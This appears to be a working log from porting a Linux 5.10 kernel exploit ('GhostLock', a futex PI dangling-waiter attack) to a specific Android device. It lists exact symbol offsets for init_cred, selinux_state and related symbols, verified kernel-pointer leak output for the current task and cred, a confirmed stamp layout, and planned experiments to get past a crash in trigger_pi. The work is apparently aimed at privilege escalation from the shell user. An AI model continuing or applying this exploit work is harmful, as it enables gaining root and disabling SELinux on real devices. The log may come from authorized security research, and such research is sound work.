# 11 · Port log: working 5.10 GhostLock implementation → this device

Reference: `pirosap/aquos-r7-ghostlock` (validated on 5.10.218 and 5.10.237).
Ported by replacing only the per-build symbol offsets.

## Ported constants

| Define | Ours |
|---|---|
| `OFF_INIT_TASK` | `0x279be80` |
| `OFF_INIT_CRED` | `0x27b0a60` |
| `OFF_SELINUX_STATE` | `0x2a41b98` |
| `OFF_LOG_BUF` | `0x2993d50` |
| `OFF_GET_TASK_PID` | `0x175548` |
| `OFF_TASK_STATE` | `0x6666b0` |
| `OFF_FUTEX_WAIT_REQUEUE_PI` | `0x294140` |
| `OFF_SEL_READ_ENFORCE` | `0x8cdfac` |
| `OFF_BSS_START` | `0x2989000` |
| `OFF_BSS_STOP` | `0x2a80c4c` |
| `OFF_RUN_START` | `0x298a188` (`__bss_start+0x1188`) |

## Result: the read side works on this device

`--leak-only` completes with every leak verified:

```
[*] _text=ffffffef80c00000 slide=0000002f78c00000 data_delta=0 init_task=ffffffef8339be80
[*] current_task=ffffff816022dc80 current_cred=ffffff80c3e41c00
[*] selinux_state=ffffffef83641b98 fake_lock=ffffffef8358ab88 ghost=ffffffef8358a208 value=ffffffef835a0000
[*] enforce=1 uid=2000 euid=2000 gid=2000
[+] leak-only verified
```

This is the first time this engagement obtained kernel pointers to its own
`task_struct` and `cred` on this device. Note `slide=0x2f78c00000` agrees with
the value derived independently from a trace call site — two unrelated methods
agreeing.

## The sigreturn stamp geometry is correct here

The port flags the stamp offset (`0xe0`) as an R6 carry-over that must be
measured per build. Its landing test settles it:

- `--poison` makes the kernel dereference a known-unmapped value **iff** it
  really reads the stamped words.
- On this device `--poison` **panics** ⇒ the stamp lands.

So `waiter = SP_futex + 0x90` and `stamp_off = 0xe0` hold for this build too.

## Current stop point

The full run reaches `[+] dangling waiter armed (y_tid=…)` and then dies at
stage `t` (inside `trigger_pi`). With the stamp proven correct, the remaining
suspects are the objects the walk reads after the stamp:

1. whether the chosen BSS run is genuinely zero at runtime here — unreadable
   from userspace, has to be validated by behaviour
2. the fake lock/task field offsets the walk touches beyond `+0x30..+0x48`

Available diagnostics for the next iteration: `--equal-ctl` (control shot that
must survive), `--all-poison` (firing test), `--task-y`, `--pc-target`,
`--stamp-off` sweep, plus `--log` which survives a hard reset via `O_DSYNC`.


## Iteration 2 — the crash is inside the trigger, in every mode

Runs tried after the stamp was proven to land (each crashes at stage `t`):

| Mode | Purpose | Result |
|---|---|---|
| default (`SCHED_OTHER↔SCHED_BATCH`) | full chain | crash at `t` |
| `--poison` | stamp landing test | **panics ⇒ stamp lands** |
| `--equal-ctl` (equal_prio 121) | entry check should return early | crash at `t` |
| `--in-class --equal-ctl` | keep CFS, avoid class switch | crash at `t` |
| `--equal-ctl --equal-prio 120` | alternative live prio | crash at `t` |

Observed environment difference: `RTPRIO soft=0 hard=0` here — the port's
RLIMIT_RTPRIO raise is a no-op on this device, so the `SCHED_FIFO` trigger path
is unavailable. The port has an unprivileged alternative (`--in-class`,
`sched_setattr` staying in CFS) and it does not help either.

`stage` file after each run reads `t`, the `trigger_pi` entry marker, and the
`[T] stage=...` printf never executes — so the kernel dies inside the
`__sched_setscheduler` / `rt_mutex_adjust_pi` call itself.

Capturing the oops via `logcat -b kernel` during the run produced no oops lines
(1098 lines captured, none matching), consistent with earlier findings on this
device.

## Next experiments

1. Determine whether the crash needs the armed waiter at all — if a sched change
   on a plain task also dies, the problem is not the stamped object graph.
2. Because `--equal-ctl` is *supposed* to skip the chain walk and still crashes,
   the prio comparison is probably not reached; the suspect is whatever
   `rt_mutex_adjust_pi` walks before it, i.e. the task's PI waiter list, which
   contains the armed waiter whose fields are stamped.
3. If the stamped prio really does not match the live prio, sweeping
   `--equal-prio` (120, 121, and the actual value reported by
   `get_task_nice`) is cheap.
4. The BSS scratch region is still unverified. If it is not zero at runtime,
   the very first dereference of the fake lock faults — which would look exactly
   like this. A different, larger gap from the 88 candidates is a cheap A/B.
